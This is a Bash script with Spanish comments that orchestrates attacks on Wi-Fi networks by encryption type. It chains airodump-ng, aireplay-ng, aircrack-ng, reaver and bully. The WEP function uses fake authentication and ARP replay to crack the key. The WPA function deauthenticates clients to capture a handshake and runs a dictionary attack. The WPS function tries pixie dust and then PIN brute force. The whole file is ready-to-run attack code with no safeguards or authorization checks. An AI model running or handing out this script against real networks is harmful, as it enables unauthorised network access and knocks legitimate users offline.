#!/bin/bash
# Ataques por tipo de cifrado. Orquesta aircrack-ng, reaver/bully y hashcat.

attack_wep() {
    iface="$1" bssid="$2" channel="$3" outdir="$4"
    log_info "Capturando tráfico WEP en $bssid (canal $channel)..."
    airodump-ng --bssid "$bssid" -c "$channel" -w "$outdir/capture" "$iface" &
    dump_pid=$!
    sleep 3

    log_info "Lanzando fake authentication..."
    aireplay-ng -1 0 -a "$bssid" "$iface" >/dev/null 2>&1

    log_info "Iniciando ARP replay (genera tráfico para capturar IVs)..."
    aireplay-ng -3 -b "$bssid" "$iface" > "$outdir/arpreplay.log" 2>&1 &
    replay_pid=$!

    log_info "Capturando IVs. Pulsa Ctrl+C cuando tengas >20000 IVs para intentar crackear."
    wait "$replay_pid" 2>/dev/null
    kill "$dump_pid" 2>/dev/null

    cap=$(ls "$outdir"/capture-*.cap 2>/dev/null | head -1)
    [ -z "$cap" ] && { log_err "No se generó captura."; return 1; }

    log_info "Intentando crackear con aircrack-ng..."
    aircrack-ng "$cap"
}

attack_wpa() {
    iface="$1" bssid="$2" channel="$3" outdir="$4" wordlist="$5"
    log_info "Capturando handshake de $bssid (canal $channel)..."
    airodump-ng --bssid "$bssid" -c "$channel" -w "$outdir/capture" "$iface" &
    dump_pid=$!
    sleep 3

    log_info "Enviando deauth para forzar reconexión (4 paquetes)..."
    aireplay-ng --deauth 4 -a "$bssid" "$iface" >/dev/null 2>&1

    log_info "Esperando handshake (máx 60s)..."
    for _ in $(seq 1 12); do
        sleep 5
        cap=$(ls "$outdir"/capture-*.cap 2>/dev/null | head -1)
        [ -n "$cap" ] && aircrack-ng -b "$bssid" "$cap" 2>/dev/null | grep -qi "handshake" && break
    done
    kill "$dump_pid" 2>/dev/null

    cap=$(ls "$outdir"/capture-*.cap 2>/dev/null | head -1)
    [ -z "$cap" ] && { log_err "No se capturó ningún archivo."; return 1; }

    if [ -z "$wordlist" ] || [ ! -f "$wordlist" ]; then
        log_warn "Sin diccionario válido. Guardado el .cap en $cap para crackear después."
        log_warn "Ejemplo: aircrack-ng -w <diccionario.txt> -b $bssid '$cap'"
        return 0
    fi

    log_info "Intentando diccionario con aircrack-ng..."
    aircrack-ng -w "$wordlist" -b "$bssid" "$cap"
}

attack_wps() {
    iface="$1" bssid="$2" channel="$3" outdir="$4"
    if command -v reaver >/dev/null 2>&1; then
        log_info "Probando pixie dust con reaver..."
        reaver -i "$iface" -b "$bssid" -c "$channel" -K 1 -vv 2>&1 | tee "$outdir/reaver_pixie.log"
        if grep -qi "WPS PIN:" "$outdir/reaver_pixie.log"; then
            log_ok "¡PIN encontrado! Revisa $outdir/reaver_pixie.log"
            return 0
        fi
        log_warn "Pixie dust falló. Probando fuerza bruta (puede tardar horas)..."
        reaver -i "$iface" -b "$bssid" -c "$channel" -vv 2>&1 | tee -a "$outdir/reaver_bruteforce.log"
    elif command -v bully >/dev/null 2>&1; then
        log_info "reaver no está instalado, usando bully..."
        bully "$iface" -b "$bssid" -c "$channel" -v 3 2>&1 | tee "$outdir/bully.log"
    else
        log_err "Ni reaver ni bully están instalados. Instala uno de los dos para ataques WPS."
        return 1
    fi
}
